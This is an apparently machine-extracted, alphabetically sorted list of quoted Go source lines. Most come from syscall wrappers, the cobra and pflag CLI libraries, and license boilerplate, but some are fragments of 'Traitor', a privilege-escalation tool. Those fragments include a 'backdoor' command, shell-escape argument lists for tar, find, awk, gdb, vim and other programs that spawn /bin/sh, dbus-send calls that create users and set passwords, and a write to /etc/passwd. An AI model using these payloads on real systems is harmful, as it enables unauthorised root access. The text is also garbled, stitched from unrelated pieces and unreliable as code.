"TEXT libc_munmap_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_open_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_openat_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_pathconf_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_pipe_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_poll_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_pread_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_ptrace_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_pwrite_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_read_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_readdir_r_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_readlink_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_readlinkat_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_recvfrom_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_recvmsg_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_removexattr_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_rename_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_renameat_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_revoke_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_rmdir_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_select_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_sendfile_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_sendmsg_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_sendto_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_setegid_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_seteuid_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_setgid_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_setgroups_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_setlogin_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_setpgid_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_setpriority_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_setprivexec_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_setregid_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_setreuid_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_setrlimit_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_setsid_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_setsockopt_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_settimeofday_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_setuid_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_setxattr_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_shmat_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_shmctl_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_shmdt_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_shmget_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_shutdown_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_socket_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_socketpair_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_stat64_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_stat_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_statfs64_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_statfs_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_symlink_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_symlinkat_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_sync_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_sysctl_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_truncate_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_umask_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_undelete_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_unlink_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_unlinkat_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_unmount_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_utimensat_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_utimes_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_wait4_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_write_trampoline<>(SB),NOSPLIT,$0-0"
"THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR"
"THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND,"
"THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY"
"THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT"
"TIOCGPGRP                       = 0x4004a777 // _IOR(167, 119, int)"
"TIPCServiceName: ""name"" variant in the C addr union"
"TIPCServiceRange,"
"TIPCServiceRange: ""nameseq"" variant in the C addr union"
"TIPCSocketAddr, "
"TIPCSocketAddr: ""id"" variant in the C addr union"
"TRUE, FALSE, True, False."
"TRUSTEE, accessEntries []EXPLICIT_ACCESS, auditEntries []EXPLICIT_ACCESS, mergedSecurityDescriptor "
"TRUSTEE, countAccessEntries uint32, accessEntries "
"TRUSTEE, group "
"TargetIdx:      pp.Target_idx,"
"TargetIdx:   pp.Target_idx,"
"Tcgetattr(fildes int, termptr "
"Tcsetattr(fildes int, when int, termptr "
"Tee(rfd int, wfd int, len int, flags int) (n int64, err error)"
"Terminal) ReadLine() (line string, err error) {"
"Terminal) ReadPassword(prompt string) (line string, err error) {"
"Terminal) SetSize(width, height int) error {"
"Terminal) Write(buf []byte) (n int, err error) {"
"Terminal) handleKey(key rune) (line string, ok bool) {"
"Terminal) move(up, down, left, right int) {"
"Terminal) readLine() (line string, err error) {"
"Terminal) setLine(newLine []rune, newPos int) {"
"TerminateJobObject(job Handle, exitCode uint32) (err error) = kernel32.TerminateJobObject"
"TerminateProcess(handle Handle, exitcode uint32) (err error)"
"Termio, error) {"
"Termios, error) {"
"Tgkill(tgid int, tid int, sig syscall.Signal) (err error)"
"The aliases are not shown to the user on tab completion, but they are accepted as valid nouns by"
"The best applications read like sentences when used, and as a result, users"
"The example above defines the completions (none, in this specific example) as well as the Active Help messages for the "
"The generated completion scripts will automatically handle completing commands and flags.  However, you can make your completions much more powerful by providing information to complete your program's nouns and flag values."
"The pflag package also defines some new functions that are not in flag,"
"Then, edit the regex (if necessary) to match the desired constant. Avoid making"
"There may be times, however, when master is closed for breaking changes. This is likely to happen as we near the release of a new version."
"There may, at times, need to be exceptions where breaking changes are allowed in release branches. These are at the discretion of the project's maintainers, and must be carefully considered before merging."
"This declares an integer flag, -flagname, stored in the pointer ip, with type "
"This hides ""badflag"" from help text, and prints "
"This hides the shortname ""n"" from help text, and prints "
"This program is used to extract duplicate const, func, and type declarations"
"This will be called when a user runs 'app help'. Additionally, help will also"
"Thread32First(snapshot Handle, threadEntry "
"Thread32Next(snapshot Handle, threadEntry "
"Time_t) (Time_t, error) {"
"Time_t) (tt Time_t, err error) {"
"Time_t) (tt Time_t, err error)"
"TimerfdCreate(clockid int, flags int) (fd int, err error)"
"TimerfdGettime(fd int, currValue "
"TimerfdSettime(fd int, flags int, newValue "
"Timespec) (int, error) {"
"Timespec) (n int, err error) {"
"Timespec) (n int, err error)"
"Timespec) Unix() (sec int64, nsec int64) {"
"Timespec, leftover "
"Timespec, remain "
"Timespec, sigmask "
"Timespec{Sec: timeout.Sec, Nsec: timeout.Usec "
"Timeval) (n int, err error) = SYS__NEWSELECT"
"Timeval) (n int, err error) {"
"Timeval) (n int, err error)"
"Timeval) (ret int, err error) = SYS_SELECT"
"Timeval) (ret int, err error) {"
"Timeval) Unix() (sec int64, nsec int64) {"
"Timeval, "
"Timeval, error) {"
"Timeval, olddelta "
"Timeval, tzp "
"Timex) (state int, err error) {"
"Timex) (state int, err error)"
"Timezoneinformation) (rc uint32, err error) [failretval==0xffffffff]"
"Timezoneinformation) (rc uint32, err error) {"
"Tms) (ticks uintptr, err error) = SYS_TIMES"
"Tms) (ticks uintptr, err error) {"
"Tms) (ticks uintptr, err error)"
"To add a constant, add the header that includes it to the appropriate variable."
"To add a new type, add in the necessary include statement at the top of the"
"To avoid this, if you are using the old build system, only generate the Go"
"To build all the files under the new build system, you must be on an amd64/Linux"
"To build the files for your current OS and architecture, make sure GOOS and"
"To load completions for every new session, add the output of the above command"
"To load completions for every new session, execute once:"
"Tokengroups)(i), nil"
"Tokengroups, buflen uint32, prevstate "
"Tokengroups, error) {"
"Tokengroups, returnlen "
"Tokenprimarygroup)(i), nil"
"Tokenprimarygroup, error) {"
"Tokenprivileges, buflen uint32, prevstate "
"Tokenprivileges, returnlen "
"Tokenuser)(i), nil"
"Tokenuser, error) {"
"TpacketStats, error) {"
"TpacketStatsV3, error) {"
"Traitor will run on all Unix-like systems, though certain exploits will only function on certain systems."
"TransmitFile(s Handle, handle Handle, bytesToWrite uint32, bytsPerSend uint32, overlapped "
"TransmitFileBuffers, flags uint32) (err error) = mswsock.TransmitFile"
"TransmitFileBuffers, flags uint32) (err error) {"
"Truncate(path string, length int64) (err error) = SYS_TRUNCATE64"
"Truncate(path string, length int64) (err error) = SYS___TRUNCATE_A"
"Truncate(path string, length int64) (err error)"
"Type:        old.Type,"
"Type:   int16(flock_type),"
"Ubuntu       DistributionID = ""ubuntu"""
"Ucred, error) {"
"Uid:     old.Uid,"
"Uid: uint32(effectiveUID),"
"UnknownLinux DistributionID = ""linux"" // default"
"Unless otherwise noted, the Go source files are distributed under"
"Unless required by applicable law or agreed to in writing, software"
"Unless your program already uses the legacy dynamic completion solution, it is recommended that you use the bash"
"Unlike the flag package, a single dash before an option means something"
"Unlinkat(dirfd int, path string, flags int) (err error)"
"UnlockFileEx(file Handle, reserved uint32, bytesLow uint32, bytesHigh uint32, overlapped "
"Unmount(path string, flags int) (err error)"
"Unmount(target string, flags int) (err error) = SYS_UMOUNT2"
"Unmount(target string, flags int) (err error) = libc.umount"
"Usage:       usage,"
"Usage:     usage,"
"Usage: goflag.Usage,"
"Use ""{{.CommandPath}} [command] --help"" for more information about a command.{{end}}"
"Use:                   fmt.Sprintf(""%s [command-line]"", ShellCompRequestCmd),"
"Use:     ""get [(-o"
"Use:   ""add [NAME] [URL]"","
"Use:   ""backdoor"","
"Use:   ""bash"","
"Use:   ""cobra-cli"","
"Use:   ""completion [bash"
"Use:   ""fish"","
"Use:   ""help [command]"","
"Use:   ""install [path]"","
"Use:   ""kubectl"","
"Use:   ""list"","
"Use:   ""powershell"","
"Use:   ""setuid"","
"Use:   ""status RELEASE_NAME"","
"Use:   ""traitor"","
"Use:   ""uninstall [path]"","
"Use:   ""zsh"","
"Use:   compCmdName,"
"UserID: string(user[:]),"
"Users need PowerShell version 5.0 or above, which comes with Windows 10 and can be downloaded separately for Windows 7 or 8.1. They can then write the completions to a file and source this file from their PowerShell profile, which is referenced by the "
"Using Cobra is easy. First, use "
"Ustat(dev int, ubuf "
"Utime(path string, buf "
"Utime(path string, utim "
"Uvmexp, error) {"
"ValidArgs:             []string{""bash"", ""zsh"", ""fish"", ""powershell""},"
"ValidArgs:  validArgs,"
"ValidArgs: []string{""bash"
"ValidArgs: validArgs,"
"ValidArgsFunction:     NoFileCompletions,"
"ValidArgsFunction: NoFileCompletions,"
"Value:     value,"
"Value:    NsecToTimeval(value.Nanoseconds()),"
"Value: wrapFlagValue(goflag.Value),"
"VerQueryValue(block unsafe.Pointer, subBlock string, pointerToBufferPointer unsafe.Pointer, bufSize "
"Verbose, ""verbose"", ""v"", false, ""verbose output"")"
"Version) MarshalText() ([]byte, error) {"
"Version, err error) "
"Version, error) {"
"Version, error)"
"Version:     _statfsVersion,"
"VirtualAlloc(address uintptr, size uintptr, alloctype uint32, protect uint32) (value uintptr, err error) = kernel32.VirtualAlloc"
"VirtualFree(address uintptr, size uintptr, freetype uint32) (err error) = kernel32.VirtualFree"
"VirtualLock(addr uintptr, length uintptr) (err error)"
"VirtualProtect(address uintptr, size uintptr, newprotect uint32, oldprotect "
"VirtualProtectEx(process Handle, address uintptr, size uintptr, newProtect uint32, oldProtect "
"VirtualQuery(address uintptr, buffer "
"VirtualQueryEx(process Handle, address uintptr, buffer "
"VirtualUnlock(addr uintptr, length uintptr) (err error)"
"Vulnerability: vulnerability,"
"WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR"
"WG_GENL_NAME                                = ""wireguard"""
"WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
"WPARTTYNAME                   = ""Global"""
"WSABuf, bufcnt uint32, recvd "
"WSABuf, bufcnt uint32, sent "
"WSAGetOverlappedResult(h Handle, o "
"WSAID_CONNECTEX)),"
"WSAID_WSARECVMSG)),"
"WSAID_WSASENDMSG)),"
"WSAIoctl(s Handle, iocc uint32, inbuf "
"WSAMsg, bytesReceived "
"WSAMsg, flags uint32, bytesSent "
"WSAProtocolInfo, bufferLength "
"WSAProtocolInfo, group uint32, flags uint32) (handle Handle, err error) [failretval==InvalidHandle] = ws2_32.WSASocketW"
"WSAProtocolInfo, group uint32, flags uint32) (handle Handle, err error) {"
"WSARecv(s Handle, bufs "
"WSARecvFrom(s Handle, bufs "
"WSASend(s Handle, bufs "
"WSASendTo(s Handle, bufs "
"WSASocket(af int32, typ int32, protocol int32, protoInfo "
"WSAStartup(verreq uint32, data "
"WTS_SESSION_INFO, count "
"WaitForSingleObject(handle Handle, waitMilliseconds uint32) (event uint32, err error) [failretval==0xffffffff]"
"WaitStatus, options int, rusage "
"Waitid(idType int, id int, info "
"WatchdogInfo, error) {"
"When [filing an issue](https://golang.org/issue/new), make sure to answer these five questions:"
"When porting Go to a new architecture/OS, this file must be implemented for"
"When the user provides an invalid flag or invalid command, Cobra responds by"
"Whence: int16(0),"
"While you are welcome to provide your own organization, typically a Cobra-based"
"White:   []byte{keyEscape, '[', '3', '7', 'm'},"
"Will continue to work, however, support for bash syntax is added and should be used instead so as to work for all shells ("
"Win32finddata) (handle Handle, err error) {"
"Win32finddata, src "
"WinVerifyTrustEx(hwnd HWND, actionId "
"WindowFlags, ShowWindowFlags                     uint32"
"WindowTitle, DesktopInfo, ShellInfo, RuntimeData NTUnicodeString"
"Windows developers unfamiliar with command line tools will often ""double-click"""
"Winsize, attrs "
"Winsize, err error) {"
"Winsize, error) {"
"Write(fd, []byte("
"WriteConsole(console Handle, buf "
"WriteProcessMemory(process Handle, baseAddress uintptr, buffer "
"WriteStringAndCheck(buf, "
"WriteStringAndCheck(buf, ""    command_aliases=()"
"WriteStringAndCheck(buf, ""    commands=()"
"WriteStringAndCheck(buf, ""    flag_parsing_disabled=1"
"WriteStringAndCheck(buf, ""    flags_completion"
"WriteStringAndCheck(buf, ""    has_completion_function=1"
"WriteStringAndCheck(buf, ""    must_have_one_flag=()"
"WriteStringAndCheck(buf, ""    must_have_one_noun=()"
"WriteStringAndCheck(buf, ""    noun_aliases=()"
"WriteStringAndCheck(buf, """
"WriteStringAndCheck(buf, ""}"
"WriteStringAndCheck(buf, fmt.Sprint("
"WriteStringAndCheck(buf, fmt.Sprintf("
"WriteStringAndCheck(buf, fmt.Sprintf(""        aliashash[%q]=%q"
"WriteStringAndCheck(buf, fmt.Sprintf(""        command_aliases"
"WriteStringAndCheck(buf, fmt.Sprintf(""    commands"
"WriteStringAndCheck(buf, fmt.Sprintf(""    flags_completion"
"WriteStringAndCheck(buf, fmt.Sprintf(""    flags_with_completion"
"WriteStringAndCheck(buf, fmt.Sprintf(""    last_command=%q"
"WriteStringAndCheck(buf, fmt.Sprintf(""    local_nonpersistent_flags"
"WriteStringAndCheck(buf, fmt.Sprintf(""    must_have_one_flag"
"WriteStringAndCheck(buf, fmt.Sprintf(""    must_have_one_noun"
"WriteStringAndCheck(buf, fmt.Sprintf(""    noun_aliases"
"WriteStringAndCheck(buf, fmt.Sprintf("""
"WriteStringAndCheck(buf, fmt.Sprintf(""_%s()"
"WriteStringAndCheck(buf, fmt.Sprintf(""_%s_root_command()"
"WriteStringAndCheck(buf, fmt.Sprintf(""__start_%s()"
"WriteStringAndCheck(buf, fmt.Sprintf(format, flag.Name))"
"WriteStringAndCheck(buf, fmt.Sprintf(format, name))"
"WriteStringAndCheck(f, msg)"
"Xucred, error) {"
"Yellow:  []byte{keyEscape, '[', '3', '3', 'm'},"
"You can use it in your Go programs, and bash etc. too."
"You may want to allow your users to disable Active Help or choose between different levels of Active Help.  It is entirely up to the program to define the type of configurability of Active Help that it wants to offer, if any."
"Zsh supports descriptions for completions. Cobra will provide the description automatically,"
"[![Build Status](https://travis-ci.org/liamg/tml.svg ""Travis CI status"")](https://travis-ci.org/liamg/tml)"
"[2]Timespec, flag int) (err error) {"
"[2]Timespec, flag int) (err error)"
"[2]Timespec, flags int) (err error) {"
"[2]Timespec, flags int) (err error)"
"[2]_C_int) (n int, err error) {"
"[2]_C_int) (n int, err error)"
"[2]_C_int, flags int) (err error) {"
"[2]_C_int, flags int) (err error)"
"[2]_C_int, flags int) (r int, w int, err error) {"
"[2]_C_int, flags int) (r int, w int, err error)"
"[8192]uint16, err error) [failretval==nil] = shell32.CommandLineToArgvW"
"[8192]uint16, err error) {"
"[8]byte{0x84, 0xa7, 0x0d, 0xee, 0x44, 0xcf, 0x60, 0x6d},"
"[8]byte{0x8a, 0x53, 0xe5, 0x4f, 0xe3, 0x51, 0xc3, 0x22},"
"[8]byte{0x8e, 0xe9, 0x76, 0xe5, 0x8c, 0x74, 0x06, 0x3e},"
"[Hugo](https://gohugo.io), and [Github CLI](https://github.com/cli/cli) to"
"[[ -z ${errors[""$key""]} ]] "
"[]bool, name string, value []bool, usage string) {"
"[]bool, name, shorthand string, value []bool, usage string) {"
"[]byte("""
"[]byte, name string, value []byte, usage string) {"
"[]byte, name, shorthand string, value []byte, usage string) {"
"[]float32, name string, value []float32, usage string) {"
"[]float32, name, shorthand string, value []float32, usage string) {"
"[]float64, name string, value []float64, usage string) {"
"[]float64, name, shorthand string, value []float64, usage string) {"
"[]int, name string, value []int, usage string) {"
"[]int, name, shorthand string, value []int, usage string) {"
"[]int32, name string, value []int32, usage string) {"
"[]int32, name, shorthand string, value []int32, usage string) {"
"[]int64, name string, value []int64, usage string) {"
"[]int64, name, shorthand string, value []int64, usage string) {"
"[]net.IP, name string, value []net.IP, usage string) {"
"[]net.IP, name, shorthand string, value []net.IP, usage string) {"
"[]string, name string, value []string, usage string) {"
"[]string, name, shorthand string, value []string, usage string) {"
"[]string{""! exec '/bin/sh'"
"[]string{""!/bin/sh"
"[]string{""!sh"
"[]string{"""
"[]string{""""},"
"[]string{""$PWNFILE"", ""/etc/hosts"", ""-T"", ""-TT"", ""sh "
"[]string{""$PWNFILE""},"
"[]string{""--""},"
"[]string{""--action=view"", ""/etc/hosts""},"
"[]string{""--exec='!/bin/sh'""},"
"[]string{""--filter=/bin/sh"", ""/dev/stdin""},"
"[]string{""--new-session"", ""--regex"", """
"[]string{""--script=$PWNFILE""},"
"[]string{""--show-machine""},"
"[]string{""-Q"", ""-nw"", ""--eval"", ""(term "
"[]string{""-S"", ""$PWNFILE"", ""x"", ""y""},"
"[]string{""-U""},"
"[]string{""-a"", ""/dev/null"", ""sh""},"
"[]string{""-b"", ""-L"", ""/bin/sh""},"
"[]string{""-c"", "":py import os"
"[]string{""-c"", ""import os"
"[]string{""-c"", ""spawn /bin/sh"
"[]string{""-cf"", ""/dev/null"", ""/dev/null"", ""--checkpoint=1"", ""--checkpoint-action=exec=/bin/sh""},"
"[]string{""-e"", """
"[]string{""-e"", ""System.Process.callCommand "
"[]string{""-e"", ""exec "
"[]string{""-e"", ""exec('/bin/sh -c "
"[]string{""-e"", ""os.execute("
"[]string{""-e"", ""require("
"[]string{""-e"", ""sh -c "
"[]string{""-e"", ""system("
"[]string{""-f"", ""$PWNFILE"", ""x""},"
"[]string{""-f"", ""/dev/null""},"
"[]string{""-h""},"
"[]string{""-i0"", ""/bin/sh""},"
"[]string{""-idf"", ""--batch-interpreter=python-fu-eval"", ""-b"", ""import os"
"[]string{""-l"", ""100"", ""-f"", ""/bin/sh""},"
"[]string{""-l""},"
"[]string{""-n"", ""$RANDOM"", ""-S"", ""-x"", ""/bin/sh""},"
"[]string{""-n"", ""1e exec sh 1>"
"[]string{""-nx"", ""-ex"", ""'!sh'"", ""-ex"", ""quit""},"
"[]string{""-o"", ""/dev/null"", ""/bin/sh""},"
"[]string{""-o"", ""ProxyCommand='"
"[]string{""-o"", ""StrictHostKeyChecking=no"", ""demo@test.rebex.net""},"
"[]string{""-p"", """
"[]string{""-p"", ""help""},"
"[]string{""-q"", ""$PWNFILE""},"
"[]string{""-q"", ""/dev/null""},"
"[]string{""-r"", ""system(getenv("
"[]string{""-s"", ""--eval=$'x:"
"[]string{""-u"", ""/"", ""/bin/sh""},"
"[]string{""-wrapper"", ""/bin/sh,-s"", "".""},"
"[]string{""-x"", ""sh"", ""-c"", ""reset"
"[]string{""-xFj"", ""--frelax-syntax-checks"", ""$PWNFILE""},"
"[]string{""../../../../../bin/sh""},"
"[]string{"".PS"
"[]string{""/bin/sh"
"[]string{""/bin/sh"", ""-c"", ""sh <$(tty) >$(tty) 2>$(tty)""},"
"[]string{""/bin/sh""},"
"[]string{""/dev/null"", "".shell /bin/sh""},"
"[]string{""/dev/null"", ""/bin/sh"", ""-i""},"
"[]string{""/etc/profile""},"
"[]string{""1"", ""/bin/sh""},"
"[]string{""7d"", ""/bin/sh""},"
"[]string{""BEGIN {system("
"[]string{""COMMAND=/bin/sh""},"
"[]string{""PAGER='sh -c "
"[]string{""PWN=/bin/sh""},"
"[]string{""System.Process.callCommand "
"[]string{""TERM=""},"
"[]string{""apply"", ""-e"", ""exec { '/bin/sh -c "
"[]string{""cont"
"[]string{""continue"
"[]string{""eval"", ""%{lua:os.execute("
"[]string{""exec '/bin/bash'"
"[]string{""exec /bin/sh <@stdin >@stdout 2>@stderr"
"[]string{""find"", ""."", ""-exec"", ""/bin/sh"", """
"[]string{""help""},"
"[]string{""logs""},"
"[]string{""man""},"
"[]string{""open"", ""-e"", ""/bin/sh -c /bin/sh"", ""rdoc""},"
"[]string{""password"
"[]string{""sh""},"
"[]string{""stdin"", ""exec:/bin/sh""},"
"[]string{""system("
"[]string{""x86_64"", ""/bin/sh""},"
"[]string{""yaml"", ""yml""}"
"[]string{string([]byte{byte('r' - 96), byte('x' - 96)}), ""reset"
"[]time.Duration, name string, value []time.Duration, usage string) {"
"[]time.Duration, name, shorthand string, value []time.Duration, usage string) {"
"[]uint, name string, value []uint, usage string) {"
"[]uint, name, shorthand string, value []uint, usage string) {"
"[at godoc.org][3], or through go's standard documentation system by"
"]"" -- ""$cur"" ) )"
"]}"" != "
"]}"" -- ""$cur"" ) )"
"]}"" -- ""$cur"")"
"]}"")"
"]}, "
"]},"""
"_ = Connect(fd, "
"_ = Listen(fd, 1)"
"_ = cmd.RegisterFlagCompletionFunc(""version"", func(cmd "
"_ = exec.Command(""dbus-send"", args...).Run()"
"_ = exec.CommandContext(ctx, ""dbus-send"", strings.Split(createUser, "" "")...).Run()"
"_ = exec.CommandContext(ctx, ""dbus-send"", strings.Split(installPackage, "" "")...).Run()"
"_ = exec.CommandContext(ctx, ""dbus-send"", strings.Split(setPassword, "" "")...).Run()"
"_ = finalCmd.ParseFlags(append(finalArgs, ""--""))"
"_ = os.Chmod(tempFile.Name(), 0755)"
"_ = pty.InheritSize(os.Stdin, ptmx)"
"_ = tml.Printf("" %s"
"_ = tml.Printf("""
"_ = tml.Printf(""<blue>[</blue><red>%s</red><blue>]</blue>"", logger.title)"
"_ = unix.Bind(fd, "
"_ = v.writeToFile(""/etc/passwd"", 1, []byte(backup)[1:])"
"_, _ = fmt.Fprintf(os.Stderr, format"
"_, _ = fmt.Fprintln(os.Stderr, err)"
"_, _ = io.Copy(io.Discard, respStart.Body)"
"_, _ = io.Copy(ioutil.Discard, waitResp.Body)"
"_, _ = io.Copy(os.Stdout, lockable)"
"_, _, _ = syscall_syscall(SYS_SEEKDIR, dir, uintptr(pos), 0)"
"_, _, _ = syscall_syscall(SYS_USLEEP, uintptr(10), 0, 0)"
"_, _, e := RawSyscall(trap, uintptr(pid), uintptr(unsafe.Sizeof("
"_, _, e := Syscall(SYS_FSTATFS64, uintptr(fd), unsafe.Sizeof("
"_, _, e := Syscall(SYS_STATFS64, uintptr(unsafe.Pointer(p)), unsafe.Sizeof("
"_, _, e := Syscall(SYS_STATFS64, uintptr(unsafe.Pointer(pathp)), unsafe.Sizeof("
"_, _, e := Syscall6(SYS__LLSEEK, uintptr(fd), uintptr(offset>>32), uintptr(offset), uintptr(unsafe.Pointer("
"_, _, e := syscall.Syscall(SYS_PLEDGE, uintptr(pptr), uintptr(unsafe.Pointer(exptr)), 0)"
"_, _, e := syscall.Syscall(SYS_PLEDGE, uintptr(unsafe.Pointer(pptr)), uintptr(expr), 0)"
"_, _, e := syscall.Syscall(SYS_UNVEIL, uintptr(pathUnsafe), uintptr(flagsUnsafe), 0)"
"_, _, e := syscall.Syscall(SYS_UNVEIL, uintptr(unsafe.Pointer(pathPtr)), uintptr(unsafe.Pointer(flagsPtr)), 0)"
"_, _, e := syscall.Syscall(syscall.SYS_IOCTL, fd, cmd, ptr)"
"_, _, e := syscall_syscall(SYS_CLOSEDIR, dir, 0, 0)"
"_, _, e := syscall_syscall(SYS___GETCWD_A, uintptr(p), uintptr(len(buf)), 0)"
"_, _, e1 := RawSyscall(SYS_CAPGET, uintptr(unsafe.Pointer(hdr)), uintptr(unsafe.Pointer(data)), 0)"
"_, _, e1 := RawSyscall(SYS_CAPSET, uintptr(unsafe.Pointer(hdr)), uintptr(unsafe.Pointer(data)), 0)"
"_, _, e1 := RawSyscall(SYS_GETPEERNAME, uintptr(fd), uintptr(unsafe.Pointer(rsa)), uintptr(unsafe.Pointer(addrlen)))"
"_, _, e1 := RawSyscall(SYS_GETRLIMIT, uintptr(resource), uintptr(unsafe.Pointer(rlim)), 0)"
"_, _, e1 := RawSyscall(SYS_GETRLIMIT, uintptr(which), uintptr(unsafe.Pointer(lim)), 0)"
"_, _, e1 := RawSyscall(SYS_GETRUSAGE, uintptr(who), uintptr(unsafe.Pointer(rusage)), 0)"
"_, _, e1 := RawSyscall(SYS_GETSOCKNAME, uintptr(fd), uintptr(unsafe.Pointer(rsa)), uintptr(unsafe.Pointer(addrlen)))"
"_, _, e1 := RawSyscall(SYS_GETTIMEOFDAY, uintptr(unsafe.Pointer(tv)), 0, 0)"
"_, _, e1 := RawSyscall(SYS_KILL, uintptr(pid), uintptr(sig), 0)"
"_, _, e1 := RawSyscall(SYS_PIPE2, uintptr(unsafe.Pointer(p)), uintptr(flags), 0)"
"_, _, e1 := RawSyscall(SYS_SETEGID, uintptr(egid), 0, 0)"
"_, _, e1 := RawSyscall(SYS_SETEUID, uintptr(euid), 0, 0)"
"_, _, e1 := RawSyscall(SYS_SETGID, uintptr(gid), 0, 0)"
"_, _, e1 := RawSyscall(SYS_SETGROUPS, uintptr(n), uintptr(unsafe.Pointer(list)), 0)"
"_, _, e1 := RawSyscall(SYS_SETGROUPS, uintptr(ngid), uintptr(unsafe.Pointer(gid)), 0)"
"_, _, e1 := RawSyscall(SYS_SETGROUPS32, uintptr(n), uintptr(unsafe.Pointer(list)), 0)"
"_, _, e1 := RawSyscall(SYS_SETPGID, uintptr(pid), uintptr(pgid), 0)"
"_, _, e1 := RawSyscall(SYS_SETREGID, uintptr(rgid), uintptr(egid), 0)"
"_, _, e1 := RawSyscall(SYS_SETREGID32, uintptr(rgid), uintptr(egid), 0)"
"_, _, e1 := RawSyscall(SYS_SETRESGID, uintptr(rgid), uintptr(egid), uintptr(sgid))"
"_, _, e1 := RawSyscall(SYS_SETRESGID32, uintptr(rgid), uintptr(egid), uintptr(sgid))"
"_, _, e1 := RawSyscall(SYS_SETRESUID, uintptr(ruid), uintptr(euid), uintptr(suid))"
"_, _, e1 := RawSyscall(SYS_SETRESUID32, uintptr(ruid), uintptr(euid), uintptr(suid))"
"_, _, e1 := RawSyscall(SYS_SETREUID, uintptr(ruid), uintptr(euid), 0)"
"_, _, e1 := RawSyscall(SYS_SETREUID32, uintptr(ruid), uintptr(euid), 0)"
"_, _, e1 := RawSyscall(SYS_SETRLIMIT, uintptr(resource), uintptr(unsafe.Pointer(rlim)), 0)"
"_, _, e1 := RawSyscall(SYS_SETRLIMIT, uintptr(which), uintptr(unsafe.Pointer(lim)), 0)"
"_, _, e1 := RawSyscall(SYS_SETRTABLE, uintptr(rtable), 0, 0)"
"_, _, e1 := RawSyscall(SYS_SETTIMEOFDAY, uintptr(unsafe.Pointer(tp)), 0, 0)"
"_, _, e1 := RawSyscall(SYS_SETTIMEOFDAY, uintptr(unsafe.Pointer(tv)), 0, 0)"
"_, _, e1 := RawSyscall(SYS_SETUID, uintptr(uid), 0, 0)"
"_, _, e1 := RawSyscall(SYS_SYSINFO, uintptr(unsafe.Pointer(info)), 0, 0)"
"_, _, e1 := RawSyscall(SYS_TGKILL, uintptr(tgid), uintptr(tid), uintptr(sig))"
"_, _, e1 := RawSyscall(SYS_TIMERFD_GETTIME, uintptr(fd), uintptr(unsafe.Pointer(currValue)), 0)"
"_, _, e1 := RawSyscall(SYS_UGETRLIMIT, uintptr(resource), uintptr(unsafe.Pointer(rlim)), 0)"
